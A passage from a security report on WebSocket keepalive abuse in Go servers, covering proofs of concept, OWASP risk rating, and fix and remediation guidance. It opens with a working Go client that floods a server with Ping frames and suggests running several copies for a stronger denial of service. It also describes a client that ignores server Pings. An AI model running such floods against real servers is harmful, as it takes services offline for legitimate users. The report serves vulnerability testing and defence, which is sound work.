    			log.Printf("Ping write error: %v", err)
    			return // Stop on error
    		}
    		// No sleep, or very minimal sleep, to send Pings as fast as possible.
    		// time.Sleep(1 * time.Millisecond) // Optional: to avoid completely saturating client CPU
    	}
    }
    
    func main() {
    	serverURL := "ws://localhost:8001/ws_nokeepalive" // Target any WebSocket server
    	// Run multiple instances of floodPings for a more effective DoS
    	go floodPings(serverURL)
    	go floodPings(serverURL)
    	// Keep main goroutine alive
    	select {}
    }
    ```
    
3. **Execution**: Run the client script.
4. **Observation**: Monitor server CPU usage and its ability to handle new legitimate connections.
5. **Expected Result**:
    - The server's CPU usage will spike significantly as it attempts to process the high volume of incoming Ping frames.
        
    - The server may become slow to respond to or unable to accept new connections from legitimate clients.
    - Depending on the server's robustness, it might eventually crash.

PoC 3: Client Not Responding to Server Pings

This PoC tests if a server correctly times out a client that doesn't respond to its Pings. This requires a server that does send Pings and expects Pongs within a deadline (a correctly configured server).

1. **Setup**:
    - Deploy a Golang WebSocket server configured to send Pings (e.g., every 5 seconds) and set a read deadline for Pongs (e.g., 15 seconds after Ping).
    - Log server-side connection closures and reasons.
2. **Client Script (e.g., in Go, modifying the default Pong handler or intercepting Pings)**:
    - The client connects to the server.
    - It needs to be programmed to receive server Pings but *not* send Pong responses. With `gorilla/websocket`, this would involve setting a custom Ping handler that does nothing or overriding the default Pong response if the library sends Pongs automatically upon Ping receipt by the read loop. More directly, ensure the client's read loop is not processing control frames or is deliberately ignoring Pings.
    - A simpler way with some libraries might be to just connect and then enter a `time.Sleep()` loop without reading from the socket, preventing any automatic Pong responses.
3. **Execution**: Run the client script.
4. **Observation**: Monitor server logs for connection closure related to the misbehaving client.
5. **Expected Result**:
    - The server should detect the absence of Pong responses within its configured timeout period.
    - The server should close the connection to this specific client.
    - If the server does *not* close the connection and continues to hold resources for this unresponsive client, it indicates a vulnerability in its keepalive timeout logic.
        
These PoCs are stateful and time-dependent, requiring observation of server behavior over a period or under specific load conditions, which differs from testing many stateless web vulnerabilities.

## **Risk Classification**

The risk posed by WebSocket Keepalive Abuse is classified based on the OWASP Risk Rating Methodology, which considers both Likelihood and Impact factors.**36**

**Likelihood Estimation:**

- **Threat Agent Factors:**
    - *Skill Level*: Low to Medium. Basic Ping floods or creating many idle connections can be scripted with relative ease, requiring only some technical skills (rated 3-6 on the OWASP scale).

    - *Motive*: Medium to High. Motivations for DoS can range from hacktivism and disruption to competitive damage or extortion, implying possible to high rewards (rated 4-9).
        
    - *Opportunity*: High. WebSocket endpoints are typically exposed to the internet, requiring no special access or resources for an attacker to reach them (rated 9).

    - *Size*: Large. The pool of potential attackers includes anonymous internet users (rated 9).
        
- **Vulnerability Factors:**
    - *Ease of Discovery*: Medium. Identifying the lack of proper keepalive handling might require code review (for missing timeouts or Ping logic) or dynamic testing (observing server behavior with idle/unresponsive clients). This could be considered 'Easy' (rated 7) if common patterns are known.
        
    - *Ease of Exploit*: Medium. Sending a high volume of Pings or establishing numerous idle connections is scriptable and doesn't require sophisticated techniques (rated 5 for 'Easy').
        
    - *Awareness*: Medium to High. General DoS attack vectors are well-known. Specifics of WebSocket keepalive abuse are documented in RFCs and library discussions, making it 'Obvious' or 'Public Knowledge' to those researching WebSockets (rated 6-9).
        
    - *Intrusion Detection*: Low to Medium. Basic Ping floods might be detected by generic network-level DoS protection systems. However, subtle resource leaks from slowly accumulating idle connections due to flawed server timeout logic are harder to detect without specific application-level monitoring (e.g., tracking goroutine counts, active WebSocket connections). This could range from 'Logged without review' (8) to 'Not logged' (9) if such specific monitoring is absent.
        
Considering these factors, the **Overall Likelihood is assessed as Medium to High**, leaning towards High if the server implementation is naive, due to the widespread knowledge of DoS techniques and the relative ease of launching basic attacks against unprotected WebSocket endpoints.

**Impact Estimation:**

- **Technical Impact:**
    - *Loss of Confidentiality*: None. This vulnerability does not typically lead to data disclosure.
    - *Loss of Integrity*: None. This vulnerability does not typically lead to data modification.
    - *Loss of Availability*: **High**. Successful exploitation directly leads to the WebSocket service, and potentially the entire application, becoming unavailable or severely degraded for legitimate users (rated 7-9).
        
    - *Loss of Accountability*: None directly.
    The primary technical impact is a severe loss of availability.
- **Business Impact:**
    - *Financial Damage*: Medium to High. Service downtime translates to lost revenue, SLA penalties, and costs associated with incident response and recovery (rated 7 for significant effect on annual profit).

    - *Reputation Damage*: Medium to High. An unreliable or unavailable service erodes user trust and can lead to customer churn (rated 4-5 for loss of accounts/goodwill).
        
    - *Non-Compliance*: Low, unless specific availability SLAs are part of regulatory requirements.
    - *Privacy Violation*: None.

The **Overall Impact is assessed as High**, driven by the direct and severe consequences for service availability and the potential for significant business repercussions.

Overall Risk:

Combining a Medium to High Likelihood with a High Impact, the Overall Risk for WebSocket Keepalive Abuse is classified as High.

This vulnerability is categorized under CWE-400: Uncontrolled Resource Consumption ('Resource Exhaustion') and can be related to CAPEC-25: Forced Deadlock if resource contention leads to such states. The attractiveness of this vulnerability to attackers stems from the combination of potentially low exploitation complexity and the significant disruptive power of a successful DoS attack. For applications relying on `gorilla/websocket`, the risk is further amplified by the library's archived and unmaintained status, which means that any underlying flaws in the library that facilitate keepalive abuse will not receive official patches. This can increase the 'Awareness' and 'Ease of Exploit' factors over time as such flaws become more widely known or easier to trigger.

## **Fix & Patch Guidance**

Addressing WebSocket Keepalive Abuse vulnerabilities in Golang applications requires a multi-faceted approach, focusing on robust server-side keepalive logic, strict connection management, and resource controls. The specific implementation details will vary depending on the WebSocket library used.

1. Implement Robust Server-Side Keepalives:

The server must proactively manage connection liveness.

- **Server-Initiated Pings**: The server should periodically send Ping frames to each connected client (e.g., every 15-30 seconds) to check if the client is still responsive.
    
- **Pong Timeout**: The server MUST expect a Pong frame in response to its Ping within a defined timeout period (e.g., Pong should arrive within 10-15 seconds after a Ping is sent). If a Pong is not received within this window, the server should consider the connection dead and close it.
    

2. Effective Use of Connection Deadlines:

Deadlines are crucial for preventing operations from blocking indefinitely.

- **For `gorilla/websocket`**:
    - When sending a Ping, a read deadline should be set for the expected Pong. The `SetPongHandler` should be used to reset this read deadline upon successful receipt of a Pong:
        
        ```Go
        
        // Example Pong Handler
        conn.SetPongHandler(func(string) error {
            log.Printf("Pong received from %s", conn.RemoteAddr())
            // Reset the read deadline
            conn.SetReadDeadline(time.Now().Add(pongWaitDuration)) // pongWaitDuration could be e.g., 60 seconds
            return nil
        })
        ```
        
    - A general read deadline (`conn.SetReadDeadline(time.Now().Add(readTimeout))`) should also be active in the main message read loop (`conn.ReadMessage()`). If no message (data or control) is received within this timeout, the read operation will fail, and the connection should be closed.
    - Ensure the read loop (`for { conn.ReadMessage()... }`) is always active for each connection to process control frames (Pings, Pongs, Close messages).
        
- **For `coder/websocket` (formerly `nhooyr.io/websocket`)**:
    - Utilize `context.WithTimeout` for all blocking operations, including `conn.Ping(ctx)`, `conn.Read(ctx)`, and `conn.Write(ctx)`.
        
        ```Go
        
        // Example Ping with context
        pingCtx, pingCancel := context.WithTimeout(backgroundCtx, 10*time.Second) // Timeout for this specific ping
        defer pingCancel()
        err := conn.Ping(pingCtx)
        if err!= nil {
            // Handle ping error/timeout, likely close connection
        }
        ```
        
    - Crucially, if `conn.Ping(ctx)` is used, ensure `conn.Reader(ctx)` is being called concurrently in another goroutine, or that `conn.CloseRead(ctx)` has been called. This is because `Ping` itself doesn't read the Pong; the reader goroutine does.
        
    - The main context governing the connection's lifetime should also be managed carefully.

**3. Control Frame Processing and Rate Limiting:**

- **Process Control Frames**: Ensure the application logic always allows for the processing of Ping, Pong, and Close frames. As noted above, this usually means having an active read mechanism.
- **Rate Limit Connections**: Limit the rate of new WebSocket connection establishments from a single IP address or globally to prevent rapid connection exhaustion attacks. Libraries like `golang.org/x/time/rate` can be used to implement token bucket algorithms.
    
- **Rate Limit Pings (Advanced)**: Consider implementing logic to detect and penalize clients sending an excessive number of Ping frames. This might involve tracking Ping frequency per connection and closing connections that violate a threshold. This is more complex as Ping/Pong are fundamental to keepalives.
- **Connection Count Limits**: Enforce a maximum number of concurrent WebSocket connections based on tested server capacity to prevent overwhelming the system.
    

**4. Graceful Connection Closure and Resource Cleanup:**

- When a keepalive fails (timeout waiting for Pong, read/write error, etc.), the server MUST ensure the WebSocket connection is properly closed using the library's `Close()` method.
- All server-side resources associated with the connection (goroutines, memory buffers, entries in connection tracking maps, file descriptors) MUST be released promptly and reliably. Deferring cleanup functions is a common Go idiom but ensure they handle all exit paths.

**5. Library-Specific Recommendations:**

- **`gorilla/websocket`**: Due to its **archived and unmaintained status** , the strongest recommendation is to **migrate to an actively maintained library such as `github.com/coder/websocket`**. If migration is not immediately feasible, extreme diligence is required in manually implementing the keepalive logic (server-pings, pong handlers with deadline resets, robust read loops) as described above. Be aware that any underlying bugs in `gorilla/websocket` itself will not be fixed.
    
- **`coder/websocket`**: Adhere strictly to the documented patterns for concurrent reading (using `Reader` or `CloseRead`) when using `Ping`. Leverage context for timeouts consistently across all blocking operations.
    
- **`golang.org/x/net/websocket` (Standard Library)**: This library is generally considered too low-level and lacks many features needed for robust, secure WebSocket servers, including easy keepalive management. Avoid its direct use for production systems requiring strong keepalives unless you are prepared to implement the entire Ping/Pong protocol, timeout logic, and concurrent read/write management from scratch, which is highly complex and error-prone.

6. Client-Side Considerations (Guidance for clients connecting to your server):

While server-side protection is paramount, providing guidance to client developers can also be beneficial:

- Advise clients that if they anticipate long periods of inactivity but wish to maintain the connection, they should also consider sending periodic Pings to the server. This helps prevent intermediaries (proxies, load balancers) from prematurely closing the connection due to their own idle timeouts. Most web browsers will automatically respond to server-sent Pings with Pongs without requiring explicit client-side JavaScript code.
    
**Table: Comparison of Keepalive Implementation in Golang WebSocket Libraries**

| **Feature** | **net/websocket (stdlib)** | **gorilla/websocket (archived)** | **coder/websocket (active)** |
| --- | --- | --- | --- |
| **Server-Sent Pings** | Manual implementation required. | Manual: Application code must call `conn.WriteMessage(websocket.PingMessage,...)` periodically. | `conn.Ping(ctx)` method available for sending pings and awaiting pongs. |
| **Pong Handling** | Manual implementation required (parsing frames). | `conn.SetPongHandler(f)`: Application defines behavior. Default handler does nothing. Crucial for resetting read deadlines. | `conn.OnPongReceived` callback can be set. `conn.Ping(ctx)` internally waits for a Pong processed by a concurrent `Reader` or `CloseRead`. |
| **Client Ping Handling** | Manual implementation required (parsing frames). | `conn.SetPingHandler(f)`: Application defines behavior. Default handler sends a Pong frame back. | `conn.OnPingReceived` callback can be set (can return `false` to suppress automatic Pong). `Reader`/`CloseRead` processes incoming Pings. |
| **Read/Write Deadlines** | Via underlying `net.Conn` if accessible; not idiomatic. | `conn.SetReadDeadline(t)`, `conn.SetWriteDeadline(t)`. Essential for keepalive timeout logic. **28** | Context-based timeouts for all operations (`Read`, `Write`, `Ping`, `Dial`, `Accept`). `NetConn()` wrapper also respects context. **30** |
| **Control Frame Processing** | Manual parsing of frames required. | Requires an active application read loop (e.g., `conn.ReadMessage()`) to process incoming control frames. **27** | Requires `conn.Reader(ctx)` to be active or `conn.CloseRead(ctx)` to be called to handle control frames. **30** |
| **Default Keepalive** | None. | No server-side initiated keepalive by default. Client browser typically auto-responds to server Pings with Pongs. **17** | Recommends TCP Keepalives may suffice for some basic cases but provides `Ping` API for WebSocket-level keepalives. **30** |
| **Maintenance Status** | Maintained as part of Go's extended libraries. | **Archived, Unmaintained.** **23** | Actively maintained. |

A defense-in-depth strategy is paramount. No single measure is a silver bullet; rather, a combination of correct Ping/Pong logic, strict deadlines, rate limiting, diligent resource management, and ongoing monitoring is necessary for robust protection. The choice of WebSocket library significantly influences the ease and correctness of implementing these defenses, with unmaintained libraries like `gorilla/websocket` posing an inherent, ongoing risk even if application-level mitigations are attempted.

## **Scope and Impact**

Scope:

The WebSocket Keepalive Abuse vulnerability affects Golang applications that implement WebSocket server functionality. The susceptibility is particularly pronounced in applications that:

- Utilize the standard `golang.org/x/net/websocket` library without extensive manual implementation of keepalive logic, due to its minimalistic feature set.

- Employ the `github.com/gorilla/websocket` library, especially given its unmaintained (archived) status. This library requires developers to manually and correctly implement server-initiated pings, pong handling, and deadline management, leaving significant room for error.
    
- Use `github.com/coder/websocket` (formerly `nhooyr.io/websocket`) but do not adhere to its specific API usage patterns, such as ensuring a concurrent reader for `Ping` operations or using `CloseRead` appropriately, and consistently applying context-based timeouts.
Essentially, any publicly accessible WebSocket endpoint in a Golang application that lacks robust, correctly implemented server-side keepalive mechanisms (including timeouts and potentially rate limiting for control frames) falls within the scope of this vulnerability.
    

Impact:

The primary and most severe impact of WebSocket Keepalive Abuse is Denial of Service (DoS). This can manifest in several ways:

1. **Complete Service Unavailability**: The WebSocket server may become entirely unresponsive to new or existing legitimate client connections. This can occur if critical resources are exhausted or if the server process crashes.
    
2. **Resource Exhaustion**:
    - **CPU Exhaustion**: High-frequency Ping floods can consume excessive CPU cycles as the server processes each incoming control frame, potentially leading to 100% CPU utilization and starving other processes or threads.

    - **Memory Exhaustion (OOM)**: Leaked goroutines or connection objects (due to idle connections not being timed out) consume memory. Over time, this can lead to Out-Of-Memory errors, causing the server process to be terminated by the operating system.
        
    - **File Descriptor Exhaustion**: Each WebSocket connection consumes a file descriptor. If connections are not closed properly, the server can run out of available file descriptors, preventing it from accepting any new network connections (including HTTP).
        
    - **Goroutine Exhaustion**: While Go can handle a very large number of goroutines, there are practical limits. Leaking goroutines per connection can lead to excessive scheduler overhead and memory consumption.

3. **Degraded Performance**: Even if the server doesn't crash, resource contention can lead to significant performance degradation, including high latency for message delivery and slow response times for legitimate users.
4. **Increased Operational Costs**: In cloud-hosted environments, resource exhaustion (particularly CPU and memory) might trigger auto-scaling events, leading to the provisioning of more server instances than necessary and thereby increasing operational expenses.
5. **Reputation Damage**: Frequent service outages or periods of unreliability due to DoS attacks can severely damage user trust and the reputation of the service provider.

6. **Cascading Failures**: In a microservices architecture, if the WebSocket service is a critical component (e.g., for real-time notifications, data streaming), its failure due to keepalive abuse can cause dependent services to fail or malfunction, leading to a wider system outage. This is particularly impactful for applications that rely heavily on real-time updates, such as financial trading platforms, collaborative tools, or online gaming services, where even brief interruptions can have significant consequences.

It's important to distinguish between "loud" failures, such as a CPU spike from a Ping flood which is often immediately noticeable, and "silent" failures, like slow resource leaks from unterminated idle connections. Silent failures can be more insidious, potentially going undetected until a critical threshold is reached, at which point the server might crash abruptly, possibly leading to data inconsistencies if operations were in progress across many connections.

## **Remediation Recommendation**

To effectively remediate and prevent WebSocket Keepalive Abuse vulnerabilities in Golang applications, a comprehensive strategy focusing on robust connection lifecycle management, resource control, and library-specific best practices is essential.

1. Prioritize Migration from Unmaintained Libraries:
    
    The continued use of github.com/gorilla/websocket is strongly discouraged due to its archived and unmaintained status.23 Organizations should prioritize migrating to an actively maintained and well-supported library such as github.com/coder/websocket. This fundamentally reduces the risk of unpatched vulnerabilities in the underlying WebSocket implementation.
    
2. Implement a Comprehensive Server-Side Keepalive Strategy:
    
    Regardless of the library, the server must proactively manage connection liveness. This involves:
    
    - **Server-Initiated Pings**: Regularly send Ping frames from the server to the client (e.g., every 15-30 seconds).
    - **Strict Pong Timeouts**: After sending a Ping, the server must expect a Pong response within a non-negotiable, relatively short timeout period (e.g., 10-15 seconds). Failure to receive a Pong within this window must result in the server closing the connection.
        
3. **Enforce Strict Connection Deadlines**:
    - For `gorilla/websocket` (if migration is not yet possible): Meticulously use `SetReadDeadline()` before any read operation (including waiting for Pongs) and ensure the deadline is reset in the `SetPongHandler()` upon Pong receipt. Implement a master read deadline for overall connection activity.

    - For `coder/websocket`: Consistently use `context.WithTimeout()` for all blocking operations (`Ping`, `Read`, `Write`, `Accept`, `Dial`). Ensure `Reader` is active or `CloseRead` is used when relying on `Ping` for keepalives.
        
4. **Implement Rate Limiting**:
    - **Connection Rate Limiting**: Limit the number of new WebSocket connections an IP address can establish within a given time window to mitigate connection flood attacks.
    - **Control Frame Rate Limiting (Advanced)**: Consider logic to detect and potentially penalize clients sending an abusive number of Ping frames. This is more complex but can help against aggressive Ping floods. Tools like `golang.org/x/time/rate` can be used for implementing these.
        
5. **Ensure Robust Resource Management and Cleanup**:
    - Guarantee that all resources associated with a WebSocket connection (goroutines, memory buffers, file descriptors, entries in tracking maps) are reliably released when the connection is closed for any reason (graceful closure, error, timeout). Use `defer` for cleanup where appropriate, but ensure all execution paths are covered.
        
6. **Active Monitoring and Alerting**:
    - Continuously monitor key server metrics: CPU utilization, memory usage, number of active WebSocket connections, goroutine count, and file descriptor usage.
        
    - Set up alerts for anomalous behavior (e.g., sudden spikes in connections or resource usage, steadily increasing goroutine counts without corresponding traffic).
7. **Regular Security Audits and Targeted Testing**:
    - Periodically audit WebSocket handling code specifically for keepalive logic, timeout management, and resource cleanup.
    - Conduct penetration tests that specifically target WebSocket keepalive mechanisms, including Ping floods and idle connection scenarios.
8. Developer Education:
    
    A critical, often overlooked, aspect of remediation is developer training. Engineers working with WebSockets must understand:
    
    - The nuances of the WebSocket protocol (RFC 6455), particularly control frames and the handshake.
    - The specific API requirements and best practices of the chosen Golang WebSocket library (e.g., the necessity of read loops in `gorilla/websocket` for control frame processing , or concurrent reader requirements for `Ping` in `coder/websocket` ). Default library behaviors are rarely sufficient for robust security.
        
Adopting a proactive security posture is vital. This includes careful library selection, establishing standardized patterns for keepalive and resource management within development teams, and integrating WebSocket-specific security checks into the SDLC. The transition from stateless HTTP to stateful WebSockets introduces new classes of resource management vulnerabilities that demand more rigorous programming discipline and a deeper understanding of long-lived connection lifecycles.

## **Summary**

WebSocket Keepalive Abuse (ws-keepalive-abuse) in Golang applications represents a significant Denial of Service (DoS) vulnerability. It arises from the improper server-side implementation or configuration of WebSocket keepalive mechanisms, primarily involving Ping/Pong control frames and the management of idle connection timeouts. Attackers can exploit these weaknesses by flooding the server with Ping frames, or by establishing connections and then failing to respond to server-initiated keepalive checks, thereby causing server resources such as CPU, memory, goroutines, or file descriptors to become exhausted.

This vulnerability is particularly relevant for Golang applications due to the common use of libraries like `github.com/gorilla/websocket` (which is now unmaintained and requires meticulous manual implementation of keepalive logic) and `github.com/coder/websocket` (which, while actively maintained, still necessitates adherence to specific API patterns for secure operation). The core problem often lies in the server's failure to proactively validate client liveness and to reclaim resources from unresponsive or malicious connections in a timely manner.

The impact of successful exploitation is typically a DoS condition, rendering the WebSocket service and potentially the entire application unavailable to legitimate users. This can lead to financial losses, reputational damage, and in microservice architectures, cascading failures of dependent services.

Key remediation strategies include:

- Migrating from unmaintained WebSocket libraries like `gorilla/websocket` to actively maintained alternatives.
- Implementing a robust server-initiated Ping/Pong mechanism with strict, non-negotiable timeouts for Pong responses.
- Consistently using connection deadlines (e.g., `SetReadDeadline` in `gorilla/websocket` or context-based timeouts in `coder/websocket`) for all blocking operations.
- Implementing rate limiting for new connection establishments and potentially for control frame frequency.
- Ensuring diligent resource cleanup (goroutines, memory, file descriptors) upon connection termination.
- Actively monitoring server resources and WebSocket connection metrics.

The shift from predominantly stateless HTTP interactions to the stateful, long-lived nature of WebSockets introduces resource management challenges that require developers to adopt more rigorous design and implementation practices. Securely handling WebSockets is not a one-time configuration but an ongoing process of careful library selection, deep protocol understanding, adherence to robust implementation patterns, and continuous operational vigilance.

## **References**

Key standards and primary library documentation include:

- RFC 6455: The WebSocket Protocol
- `github.com/gorilla/websocket` package documentation
- `github.com/coder/websocket` package documentation (and its predecessor `nhooyr.io/websocket`)
- OWASP Risk Rating Methodology and relevant OWASP Top 10 or ASVS sections.
- CWE-400: Uncontrolled Resource Consumption.

The information regarding WebSocket keepalive security, particularly for Golang, is distributed across these varied sources. This report consolidates these perspectives to provide a focused analysis. Given the evolving nature of software libraries and security threats, continuous attention to updated documentation and security best practices is imperative for developers.